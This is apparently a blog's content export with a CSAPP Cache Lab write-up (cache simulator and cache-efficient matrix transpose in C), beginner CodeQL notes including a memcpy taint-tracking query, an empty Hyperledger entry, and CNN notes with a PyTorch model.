class="keyword">char</span> op;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> addr;</span><br><span class="line">    <span class="keyword">int</span> size;</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">fscanf</span>(file, <span class="string">&quot; %c %x,%d&quot;</span>, &amp;op, &amp;addr, &amp;size) != EOF) &#123;</span><br><span class="line">        <span class="comment">// printf(&quot;%c %x %u\n&quot;, op, addr, size);</span></span><br><span class="line">        solve(op, addr, size);</span><br><span class="line">        timeAdvance();</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(file);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">    parseArguments(argc, argv);</span><br><span class="line">    buildCache();</span><br><span class="line">    readTraceFile();</span><br><span class="line">    freeCache();</span><br><span class="line">    printSummary(hit, miss, eviction);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<img data-src="http://qiniu.garen-wang.top/static/images/CSAPP-Cache-Lab-Writeup/result-a.png">
<h2 id="Part-B-Efficient-Matrix-Transpose"><a href="#Part-B-Efficient-Matrix-Transpose" class="headerlink" title="Part B: Efficient Matrix Transpose"></a>Part B: Efficient Matrix Transpose</h2><p>这个部分是重头戏。这个部分要求你完成一个矩阵转置的函数，需要满足在不同size下miss次数不高于一定次数，即尽可能降低miss rate。</p>
<p>在这一个part中，$s=5, E=1, b=5$，即我们考虑cache是一个包含32个set，每个set存32个byte的direct-mapped cache。</p>
<p>这篇博客写得非常非常详细，可以直接看 <a href="https://yangtau.me/computer-system/csapp-cache.html">https://yangtau.me/computer-system/csapp-cache.html</a></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> transpose_submit_desc[] = <span class="string">&quot;Transpose submission&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">transpose_submit</span><span class="params">(<span class="keyword">int</span> M, <span class="keyword">int</span> N, <span class="keyword">int</span> A[N][M], <span class="keyword">int</span> B[M][N])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (M == <span class="number">32</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">int</span> block_size = <span class="number">8</span>;</span><br><span class="line">        <span class="comment">// 1. normal blocking: 344 misses</span></span><br><span class="line">        <span class="comment">// int i = 0, j = 0, ii, jj, tmp;</span></span><br><span class="line">        <span class="comment">// for (i = 0; i &lt; N; i += block_size) &#123;</span></span><br><span class="line">        <span class="comment">//     for (j = 0; j &lt; M; j += block_size) &#123;</span></span><br><span class="line">        <span class="comment">//         for (ii = i; ii &lt; i + block_size &amp;&amp; ii &lt; N; ++ii) &#123;</span></span><br><span class="line">        <span class="comment">//             for (jj = j; jj &lt; j + block_size &amp;&amp; jj &lt; M; ++jj) &#123;</span></span><br><span class="line">        <span class="comment">//                 tmp = A[ii][jj];</span></span><br><span class="line">        <span class="comment">//                 B[jj][ii] = tmp;</span></span><br><span class="line">        <span class="comment">//             &#125;</span></span><br><span class="line">        <span class="comment">//         &#125;</span></span><br><span class="line">        <span class="comment">//     &#125;</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 2. use local variables: 288 misses</span></span><br><span class="line">        <span class="comment">// int i, j, k, a0, a1, a2, a3, a4, a5, a6, a7;</span></span><br><span class="line">        <span class="comment">// for (i = 0; i &lt; M; i += block_size) &#123;</span></span><br><span class="line">        <span class="comment">//     for (j = 0; j &lt; N; j += block_size) &#123;</span></span><br><span class="line">        <span class="comment">//         for (k = 0; k &lt; block_size; ++k) &#123;</span></span><br><span class="line">        <span class="comment">//             a0 = A[i + k][j + 0];</span></span><br><span class="line">        <span class="comment">//             a1 = A[i + k][j + 1];</span></span><br><span class="line">        <span class="comment">//             a2 = A[i + k][j + 2];</span></span><br><span class="line">        <span class="comment">//             a3 = A[i + k][j + 3];</span></span><br><span class="line">        <span class="comment">//             a4 = A[i + k][j + 4];</span></span><br><span class="line">        <span class="comment">//             a5 = A[i + k][j + 5];</span></span><br><span class="line">        <span class="comment">//             a6 = A[i + k][j + 6];</span></span><br><span class="line">        <span class="comment">//             a7 = A[i + k][j + 7];</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//             B[j + 0][i + k] = a0;</span></span><br><span class="line">        <span class="comment">//             B[j + 1][i + k] = a1;</span></span><br><span class="line">        <span class="comment">//             B[j + 2][i + k] = a2;</span></span><br><span class="line">        <span class="comment">//             B[j + 3][i + k] = a3;</span></span><br><span class="line">        <span class="comment">//             B[j + 4][i + k] = a4;</span></span><br><span class="line">        <span class="comment">//             B[j + 5][i + k] = a5;</span></span><br><span class="line">        <span class="comment">//             B[j + 6][i + k] = a6;</span></span><br><span class="line">        <span class="comment">//             B[j + 7][i + k] = a7;</span></span><br><span class="line">        <span class="comment">//         &#125;</span></span><br><span class="line">        <span class="comment">//     &#125;</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. copy then transpose: 260 misses</span></span><br><span class="line">        <span class="keyword">int</span> i, j, ii, jj, a0, a1, a2, a3, a4, a5, a6, a7;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; N; i += block_size) &#123;</span><br><span class="line">            <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; M; j += block_size) &#123;</span><br><span class="line">                <span class="keyword">for</span> (ii = i, jj = j; ii &lt; i + block_size; ++ii, ++jj) &#123;</span><br><span class="line">                    a0 = A[ii][j + <span class="number">0</span>];</span><br><span class="line">                    a1 = A[ii][j + <span class="number">1</span>];</span><br><span class="line">                    a2 = A[ii][j + <span class="number">2</span>];</span><br><span class="line">                    a3 = A[ii][j + <span class="number">3</span>];</span><br><span class="line">                    a4 = A[ii][j + <span class="number">4</span>];</span><br><span class="line">                    a5 = A[ii][j + <span class="number">5</span>];</span><br><span class="line">                    a6 = A[ii][j + <span class="number">6</span>];</span><br><span class="line">                    a7 = A[ii][j + <span class="number">7</span>];</span><br><span class="line"></span><br><span class="line">                    B[jj][i + <span class="number">0</span>] = a0;</span><br><span class="line">                    B[jj][i + <span class="number">1</span>] = a1;</span><br><span class="line">                    B[jj][i + <span class="number">2</span>] = a2;</span><br><span class="line">                    B[jj][i + <span class="number">3</span>] = a3;</span><br><span class="line">                    B[jj][i + <span class="number">4</span>] = a4;</span><br><span class="line">                    B[jj][i + <span class="number">5</span>] = a5;</span><br><span class="line">                    B[jj][i + <span class="number">6</span>] = a6;</span><br><span class="line">                    B[jj][i + <span class="number">7</span>] = a7;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span> (ii = <span class="number">0</span>; ii &lt; block_size; ++ii) &#123;</span><br><span class="line">                    <span class="keyword">for</span> (jj = ii + <span class="number">1</span>; jj &lt; block_size; ++jj) &#123;</span><br><span class="line">                        a0 = B[j + ii][i + jj];</span><br><span class="line">                        B[j + ii][i + jj] = B[j + jj][i + ii];</span><br><span class="line">                        B[j + jj][i + ii] = a0;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (M == <span class="number">64</span>) &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">int</span> i, j, k, a0, a1, a2, a3, a4, a5, a6, a7, tmp;</span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">int</span> block_size = <span class="number">8</span>;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; M; i += block_size) &#123;</span><br><span class="line">            <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; N; j += block_size) &#123;</span><br><span class="line">                <span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; block_size / <span class="number">2</span>; ++k) &#123;</span><br><span class="line">                    a0 = A[i + k][j + <span class="number">0</span>];</span><br><span class="line">                    a1 = A[i + k][j + <span class="number">1</span>];</span><br><span class="line">                    a2 = A[i + k][j + <span class="number">2</span>];</span><br><span class="line">                    a3 = A[i + k][j + <span class="number">3</span>];</span><br><span class="line">                    a4 = A[i + k][j + <span class="number">4</span>];</span><br><span class="line">                    a5 = A[i + k][j + <span class="number">5</span>];</span><br><span class="line">                    a6 = A[i + k][j + <span class="number">6</span>];</span><br><span class="line">                    a7 = A[i + k][j + <span class="number">7</span>];</span><br><span class="line"></span><br><span class="line">                    B[j + <span class="number">0</span>][i + k] = a0;</span><br><span class="line">                    B[j + <span class="number">1</span>][i + k] = a1;</span><br><span class="line">                    B[j + <span class="number">2</span>][i + k] = a2;</span><br><span class="line">                    B[j + <span class="number">3</span>][i + k] = a3;</span><br><span class="line"></span><br><span class="line">                    B[j + <span class="number">0</span>][i + k + <span class="number">4</span>] = a4;</span><br><span class="line">                    B[j + <span class="number">1</span>][i + k + <span class="number">4</span>] = a5;</span><br><span class="line">                    B[j + <span class="number">2</span>][i + k + <span class="number">4</span>] = a6;</span><br><span class="line">                    B[j + <span class="number">3</span>][i + k + <span class="number">4</span>] = a7;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; block_size / <span class="number">2</span>; ++k) &#123;</span><br><span class="line">                    a0 = A[i + <span class="number">4</span>][j + k];</span><br><span class="line">                    a1 = A[i + <span class="number">5</span>][j + k];</span><br><span class="line">                    a2 = A[i + <span class="number">6</span>][j + k];</span><br><span class="line">                    a3 = A[i + <span class="number">7</span>][j + k];</span><br><span class="line">                    a4 = A[i + <span class="number">4</span>][j + k + <span class="number">4</span>];</span><br><span class="line">                    a5 = A[i + <span class="number">5</span>][j + k + <span class="number">4</span>];</span><br><span class="line">                    a6 = A[i + <span class="number">6</span>][j + k + <span class="number">4</span>];</span><br><span class="line">                    a7 = A[i + <span class="number">7</span>][j + k + <span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">                    tmp = B[j + k][i + <span class="number">4</span>]; B[j + k][i + <span class="number">4</span>] = a0; a0 = tmp;</span><br><span class="line">                    tmp = B[j + k][i + <span class="number">5</span>]; B[j + k][i + <span class="number">5</span>] = a1; a1 = tmp;</span><br><span class="line">                    tmp = B[j + k][i + <span class="number">6</span>]; B[j + k][i + <span class="number">6</span>] = a2; a2 = tmp;</span><br><span class="line">                    tmp = B[j + k][i + <span class="number">7</span>]; B[j + k][i + <span class="number">7</span>] = a3; a3 = tmp;</span><br><span class="line"></span><br><span class="line">                    B[j + k + <span class="number">4</span>][i + <span class="number">0</span>] = a0;</span><br><span class="line">                    B[j + k + <span class="number">4</span>][i + <span class="number">1</span>] = a1;</span><br><span class="line">                    B[j + k + <span class="number">4</span>][i + <span class="number">2</span>] = a2;</span><br><span class="line">                    B[j + k + <span class="number">4</span>][i + <span class="number">3</span>] = a3;</span><br><span class="line">                    B[j + k + <span class="number">4</span>][i + <span class="number">4</span>] = a4;</span><br><span class="line">                    B[j + k + <span class="number">4</span>][i + <span class="number">5</span>] = a5;</span><br><span class="line">                    B[j + k + <span class="number">4</span>][i + <span class="number">6</span>] = a6;</span><br><span class="line">                    B[j + k + <span class="number">4</span>][i + <span class="number">7</span>] = a7;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 61 * 67, 1793 misses</span></span><br><span class="line">        <span class="keyword">int</span> i, j, k, l, a0, a1, a2, a3, a4, a5, a6, a7;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; N; i += <span class="number">8</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; M; j += <span class="number">8</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (i + <span class="number">7</span> &lt; N &amp;&amp; j + <span class="number">7</span> &lt; M) &#123;</span><br><span class="line">                    <span class="comment">// bad</span></span><br><span class="line">                    <span class="comment">// for (k = i; k &lt; i + 8; ++k) &#123;</span></span><br><span class="line">                    <span class="comment">//     a0 = A[k][j + 0];</span></span><br><span class="line">                    <span class="comment">//     a1 = A[k][j + 1];</span></span><br><span class="line">                    <span class="comment">//     a2 = A[k][j + 2];</span></span><br><span class="line">                    <span class="comment">//     a3 = A[k][j + 3];</span></span><br><span class="line">                    <span class="comment">//     a4 = A[k][j + 4];</span></span><br><span class="line">                    <span class="comment">//     a5 = A[k][j + 5];</span></span><br><span class="line">                    <span class="comment">//     a6 = A[k][j + 6];</span></span><br><span class="line">                    <span class="comment">//     a7 = A[k][j + 7];</span></span><br><span class="line"></span><br><span class="line">                    <span class="comment">//     B[j + 0][k] = a0;</span></span><br><span class="line">                    <span class="comment">//     B[j + 1][k] = a1;</span></span><br><span class="line">                    <span class="comment">//     B[j + 2][k] = a2;</span></span><br><span class="line">                    <span class="comment">//     B[j + 3][k] = a3;</span></span><br><span class="line">                    <span class="comment">//     B[j + 4][k] = a4;</span></span><br><span class="line">                    <span class="comment">//     B[j + 5][k] = a5;</span></span><br><span class="line">                    <span class="comment">//     B[j + 6][k] = a6;</span></span><br><span class="line">                    <span class="comment">//     B[j + 7][k] = a7;</span></span><br><span class="line">                    <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">                    <span class="comment">// good</span></span><br><span class="line">                </span><br><span class="line">                    <span class="keyword">for</span> (k = j; k &lt; j + <span class="number">8</span>; ++k) &#123;</span><br><span class="line">                        a0 = A[i + <span class="number">0</span>][k];</span><br><span class="line">                        a1 = A[i + <span class="number">1</span>][k];</span><br><span class="line">                        a2 = A[i + <span class="number">2</span>][k];</span><br><span class="line">                        a3 = A[i + <span class="number">3</span>][k];</span><br><span class="line">                        a4 = A[i + <span class="number">4</span>][k];</span><br><span class="line">                        a5 = A[i + <span class="number">5</span>][k];</span><br><span class="line">                        a6 = A[i + <span class="number">6</span>][k];</span><br><span class="line">                        a7 = A[i + <span class="number">7</span>][k];</span><br><span class="line"></span><br><span class="line">                        B[k][i + <span class="number">0</span>] = a0;</span><br><span class="line">                        B[k][i + <span class="number">1</span>] = a1;</span><br><span class="line">                        B[k][i + <span class="number">2</span>] = a2;</span><br><span class="line">                        B[k][i + <span class="number">3</span>] = a3;</span><br><span class="line">                        B[k][i + <span class="number">4</span>] = a4;</span><br><span class="line">                        B[k][i + <span class="number">5</span>] = a5;</span><br><span class="line">                        B[k][i + <span class="number">6</span>] = a6;</span><br><span class="line">                        B[k][i + <span class="number">7</span>] = a7;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">for</span> (k = i; k &lt; N &amp;&amp; k &lt; i + <span class="number">8</span>; ++k) &#123;</span><br><span class="line">                        <span class="keyword">for</span> (l = j; l &lt; M &amp;&amp; l &lt; j + <span class="number">8</span>; ++l) &#123;</span><br><span class="line">                            B[l][k] = A[k][l];</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<img data-src="http://qiniu.garen-wang.top/static/images/CSAPP-Cache-Lab-Writeup/result-b.png">]]></content>
  </entry>
  <entry>
    <title>CodeQL Learning Notes</title>
    <url>/2021/03/23/CodeQL-Learning-Notes/</url>
    <content><![CDATA[<h2 id="beginning"><a href="#beginning" class="headerlink" title="beginning"></a>beginning</h2><p>Why do I need to learn CodeQL? Emm… It’s all about SRP.</p>
<p>CodeQL is a query tool that powers security researchers, which consists of code scanning, vulnerbilities discovering, etc.</p>
<p>As for the reason, one of the requirements of SRP is to use CodeQL to develop a vulnerbilities scanning program. Personnally I think it’s a great challenge for me as I am not skilled at this field before. But I will try my best.</p>
<a id="more"></a>
<h2 id="Configuration"><a href="#Configuration" class="headerlink" title="Configuration"></a>Configuration</h2><p>I set up the environment on VSCode, Arch Linux, and the general configuration is simple:</p>
<ol>
<li><p>Download <code>CodeQL</code> extension in VSCode.</p>
</li>
<li><p>Let the extension automatically download CodeQL CLI.</p>
</li>
</ol>
<p>According to the official documentation, it is not recommended to manually set the path of executable in extension, because sometimes some nasty errors would occur.(but it seems nothing special?)</p>
<p>If you need to use CodeQL CLI outside VSCode, maybe you should manually install another one.</p>
<h2 id="First-Demo"><a href="#First-Demo" class="headerlink" title="First Demo"></a>First Demo</h2><p>There is a repository called <a href="https://github.com/github/vscode-codeql-starter">vscode-codeql-starter</a> in GitHub, which you can use to run your first query in CodeQL locally.</p>
<p>What’s more, there is a learning repo available in GitHub called <a href="https://github.com/github/codeql-uboot"><code>codeql-uboot</code></a>, which aims to use codeql to find 9 vulnerbilities about <code>memcpy</code>.</p>
<h1 id="Hello-World"><a href="#Hello-World" class="headerlink" title="Hello World"></a>Hello World</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select &quot;hello world&quot;</span><br></pre></td></tr></table></figure>
<h1 id="Basic-Grammar"><a href="#Basic-Grammar" class="headerlink" title="Basic Grammar"></a>Basic Grammar</h1><p>Similar to SQL, CodeQL has three essential keywords: <code>from</code>, <code>where</code>, <code>select</code>.</p>
<p>Let’s look through examples from <code>codeql-uboot</code>, whose code language is c++.</p>
<h2 id="Find-Function-Definitions"><a href="#Find-Function-Definitions" class="headerlink" title="Find Function Definitions"></a>Find Function Definitions</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import cpp</span><br><span class="line"></span><br><span class="line">from Function f</span><br><span class="line">where f.getName() &#x3D; &quot;memcpy&quot;</span><br><span class="line">select f, &quot;a function named memcpy&quot;</span><br></pre></td></tr></table></figure>
<p>CodeQL has lots of useful APIs, which can be seen conveniently when using auto-completion in VSCode.</p>
<p>How to start a query? <code>Ctrl+Shift+P</code>, type <code>codeql</code>, select <code>Run Query</code>. After a while you can see the result in your right hand side.</p>
<h2 id="Find-Macro-Definitions"><a href="#Find-Macro-Definitions" class="headerlink" title="Find Macro Definitions"></a>Find Macro Definitions</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from Macro m</span><br><span class="line">where m.getName() in [&quot;ntohs&quot;, &quot;ntohl&quot;, &quot;ntohll&quot;]</span><br><span class="line">select </span><br></pre></td></tr></table></figure>
<h2 id="Find-Function-Calls"><a href="#Find-Function-Calls" class="headerlink" title="Find Function Calls"></a>Find Function Calls</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from FunctionCall fc</span><br><span class="line">where fc.getTarget().getName() &#x3D; &quot;memcpy&quot;</span><br><span class="line">select fc</span><br></pre></td></tr></table></figure>
<h2 id="Find-Macro-Invocations"><a href="#Find-Macro-Invocations" class="headerlink" title="Find Macro Invocations"></a>Find Macro Invocations</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from MacroInvocation inv</span><br><span class="line">where inv.getMacro().getName().regexpMatch(&quot;ntoh(s|l|ll)&quot;)</span><br><span class="line">select inv</span><br></pre></td></tr></table></figure>
<h2 id="Find-Macro-Expressions"><a href="#Find-Macro-Expressions" class="headerlink" title="Find Macro Expressions"></a>Find Macro Expressions</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from MacroInvocation inv</span><br><span class="line">where inv.getMacro().getName().regexpMatch(&quot;ntoh(s|l|ll)&quot;)</span><br><span class="line">select inv.getExpr()</span><br></pre></td></tr></table></figure>
<h2 id="Create-A-Class"><a href="#Create-A-Class" class="headerlink" title="Create A Class"></a>Create A Class</h2><p>Similar to lots of other programming languages, CodeQL has the feature of object-oriented programming.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class NetworkByteSwap extends Expr &#123;</span><br><span class="line">  NetworkByteSwap() &#123;</span><br><span class="line">    exists (MacroInvocation inv | </span><br><span class="line">      inv.getMacro().getName() in [&quot;ntohs&quot;, &quot;ntohl&quot;, &quot;ntohll&quot;] and </span><br><span class="line">      this &#x3D; inv.getExpr()</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from NetworkByteSwap n</span><br><span class="line">select n, &quot;Network byte swap&quot;</span><br></pre></td></tr></table></figure>
<p>Here <code>exists</code> can be understood as an existential quantifier in Discrete Mathematics, where we first define the variables then list all propositions the variables should satisfy, with a separator <code>|</code>.</p>
<h2 id="Data-Flow-in-CodeQL"><a href="#Data-Flow-in-CodeQL" class="headerlink" title="Data Flow in CodeQL"></a>Data Flow in CodeQL</h2><p>First we introduce two important terminologies: <code>source</code> and <code>sink</code>.</p>
<p><strong>Source</strong> is the function that is to blame when vulnerbilities occur, and <strong>sink</strong> refers to dangerous factors(e.g. pointer, parameter, etc.) in a specific function. Code is vulnerable if tainted data <strong>flows</strong> from a source to a sink.</p>
<p>CodeQL has implemented two kinds of data flows.</p>
<ol>
<li>Local data flow. In this condition, tainted data will be tracked only inside a function scope.</li>
<li>Global data flow. In this condition, tainted data can be tracked globally, not limited in a function scope.</li>
</ol>
<p>Generally, for source and sink, we need to find the characteristics they have and write predicates for them respectively.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import cpp</span><br><span class="line">import semmle.code.cpp.dataflow.DataFlow</span><br><span class="line">import semmle.code.cpp.dataflow.TaintTracking</span><br><span class="line"></span><br><span class="line">class NetworkByteSwap extends Expr &#123;</span><br><span class="line">  NetworkByteSwap() &#123;</span><br><span class="line">    exists (MacroInvocation inv | </span><br><span class="line">      inv.getMacro().getName() in [&quot;ntohs&quot;, &quot;ntohl&quot;, &quot;ntohll&quot;] and </span><br><span class="line">      this &#x3D; inv.getExpr()</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Config extends TaintTracking::Configuration &#123;</span><br><span class="line">  Config() &#123;</span><br><span class="line">    this &#x3D; &quot;Network2MemFuncLength&quot;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSource(DataFlow::Node source) &#123;</span><br><span class="line">    source.asExpr() instanceof NetworkByteSwap</span><br><span class="line">  &#125;</span><br><span class="line">  override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">    exists (FunctionCall fc |</span><br><span class="line">      sink.asExpr() &#x3D; fc.getArgument(2) and </span><br><span class="line">      fc.getTarget().hasQualifiedName(&quot;memcpy&quot;)</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from Config cfg, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class="line">where cfg.hasFlowPath(source, sink)</span><br><span class="line">select sink, source, sink, &quot;Network byte swap flows to memory&quot;</span><br></pre></td></tr></table></figure>
<p>We can inherit <code>TaintTracking::Config</code> and override some specific predicates to customize our data flow. Respectively, <code>inSource</code> and <code>isSink</code> restrict conditions that a <code>DataFlow::Node</code> can be regarded as source and sink. And if we need to remove some false-positive queries, override predicate <code>isSanitizer</code> to make our queries more accurately.</p>
]]></content>
  </entry>
  <entry>
    <title>Concepts about Hyperledger Fabric v2.2</title>
    <url>/2021/07/27/Concepts-about-Hyperledger-Fabric-v2-2/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>Convolution Neural Network Learning Notes</title>
    <url>/2021/01/25/Convolution-Neural-Network-Learning-Notes/</url>
    <content><![CDATA[<h2 id="Definition-of-Convolution-Neural-Network"><a href="#Definition-of-Convolution-Neural-Network" class="headerlink" title="Definition of Convolution Neural Network"></a>Definition of Convolution Neural Network</h2><p>Definition in Discrete Mathematics:</p>
<script type="math/tex; mode=display">h(x) = (f*g)(x) = \sum_{t=-\infty}^{\infty} f(t)g(x-t)</script><p>Two-dimensional Definition(I: image, K: kernal, cross-correlation):</p>
<script type="math/tex; mode=display">h(i,j) = (I*K)(i,j) = \sum_m \sum_n I(i-m,j-n)K(m,n)</script><p>However, our convolution here does not reverse kernal, which means actually:</p>
<script type="math/tex; mode=display">h(i,j) = (I*K)(i,j) = \sum_m \sum_n I(i+m,j+n)K(m,n)</script><p>Without reversed kernal, the operation is exactly the matrix dot multiplication.</p>
<a id="more"></a>
<h2 id="Relevant-Concepts"><a href="#Relevant-Concepts" class="headerlink" title="Relevant Concepts"></a>Relevant Concepts</h2><p>A kernal is a square matrix responsible for extracting a feature from input. When using multiple kernal, we can extract multiple features from the same picture sample.</p>
<p>The size of kernal is commonly an odd number, and especially there exists 1*1 kernal.</p>
<p>The set of convolution kernals is called Filter. The number of kernal in a filter is usually euqal to that of input channels. For example, when processing RGB pictures, we usually use three kernals to calculate with corresponding channels, and these three kernals can be included in a filter.</p>
<p>Similarly with neural network learnt before, there is a bias corresponding with each filter, whose size is the same as the output size of the filter.</p>
<p>Several filters and their corresponding bias matrices consist of a WeightsBias.</p>
<p>Stride is a parameter of a convolution layer, which stands for the increment of coordination of width and height after each update is done. By default the stride is set 1. Obviously, the bigger the stride, the smaller the output size.</p>
<p>Padding is used when we want to control the output size. When padding is needed, we will add several layer of zeros on the edge of original matrix, thus incrementing the size. By default the padding is 0. On the contrary, the bigger the padding, the bigger the output size.</p>
<h2 id="Size-Calculation"><a href="#Size-Calculation" class="headerlink" title="Size Calculation"></a>Size Calculation</h2><p>Actually we can calculate the width and height of output:</p>
<script type="math/tex; mode=display">Width_{out} = \lfloor \frac{Width_{in} - Width_{K} + 2Padding}{Stride} \rfloor + 1</script><script type="math/tex; mode=display">Height_{out} = \lfloor \frac{Height_{in} - Height_{K} + 2Padding}{Stride} \rfloor+ 1</script><h2 id="About-PyTorch"><a href="#About-PyTorch" class="headerlink" title="About PyTorch"></a>About PyTorch</h2><p>When retrieving data from the dataloader previously loaded, the dimension of the input tensor is 4, respectively:</p>
<ol>
<li>batch size: int, one part of hyper-parameter</li>
<li>input channels: int, the number of channels of data(gray-scale: 1, RGB: 3)</li>
<li>width: int, consistent with dataset</li>
<li>height: int, consistent with dataset</li>
</ol>
<p>The number of first dimension remains unchanged during the whole forward process. However, input channels will be changed according to our design of convolution layers. Width and height can be calculated by applying the formulas above.</p>
<p>When <code>LayerChoice</code> and <code>InputChoice</code> are used in definition of model, we must guarantee each calculation is meaningful rather than size dismatched.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NeuralNet</span>(<span class="params">nn.Module</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">super</span>(NeuralNet, self).__init__()</span><br><span class="line">        self.conv1 = mutables.LayerChoice(OrderedDict([</span><br><span class="line">            (<span class="string">&quot;conv3*3&quot;</span>, nn.Conv2d(<span class="number">3</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">1</span>)),</span><br><span class="line">            (<span class="string">&quot;conv5*5&quot;</span>, nn.Conv2d(<span class="number">3</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">1</span>))</span><br><span class="line">        ]), key=<span class="string">&#x27;conv1&#x27;</span>)</span><br><span class="line">        self.mid_conv = mutables.LayerChoice([</span><br><span class="line">            nn.Conv2d(<span class="number">8</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">1</span>, padding=<span class="number">1</span>),</span><br><span class="line">            nn.Conv2d(<span class="number">8</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">1</span>, padding=<span class="number">2</span>)</span><br><span class="line">        ], key=<span class="string">&#x27;mid_conv&#x27;</span>)</span><br><span class="line">        self.conv2 = nn.Conv2d(<span class="number">8</span>, <span class="number">16</span>, <span class="number">5</span>, <span class="number">1</span>)</span><br><span class="line">        self.pool = nn.MaxPool2d(<span class="number">2</span>, <span class="number">2</span>)</span><br><span class="line">        self.func1 = nn.Linear(<span class="number">16</span> * <span class="number">5</span> * <span class="number">5</span>, <span class="number">120</span>)</span><br><span class="line">        self.func2 = nn.Linear(<span class="number">120</span>, <span class="number">84</span>)</span><br><span class="line">        self.func3 = nn.Linear(<span class="number">84</span>, <span class="number">10</span>)</span><br><span class="line">        self.input_switch = mutables.InputChoice(n_candidates=<span class="number">2</span>, n_chosen=<span class="number">1</span>, key=<span class="string">&quot;skip_conv&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span>(<span class="params">self, x</span>):</span></span><br><span class="line">        x = self.pool(F.relu(self.conv1(x)))</span><br><span class="line">        old_x = x</span><br><span class="line">        zero_x = torch.zeros_like(old_x)</span><br><span class="line">        skip_x = self.input_switch([zero_x, old_x])</span><br><span class="line">        x = F.relu(self.mid_conv(x))</span><br><span class="line">        x += skip_x</span><br><span class="line">        x = self.pool(F.relu(self.conv2(x)))</span><br><span class="line">        x = x.view(-<span class="number">1</span>, <span class="number">16</span> * <span class="number">5</span> * <span class="number">5</span>)</span><br><span class="line">        x = F.relu(self.func1(x))</span><br><span class="line">        x = F.relu(self.func2(x))</span><br><span class="line">        x = self.func3(x)</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>In this example, dataset is CIFAR-10, where all samples are 32*32.</p>
<p>When<code>x = self.conv1(x)</code>, now the size may be 30 or 28. After 2*2 pooling, the size(width and height) may be 15 or 14.</p>
<p>Here we must make the size unchanged after <code>x = self.mid_conv(x)</code> since it is a layer allowed to be skipped. And we can see when kernal size is 3, padding is 1 and kernal size equals 5, padding euqals 2, width and height both remain unchanged.</p>
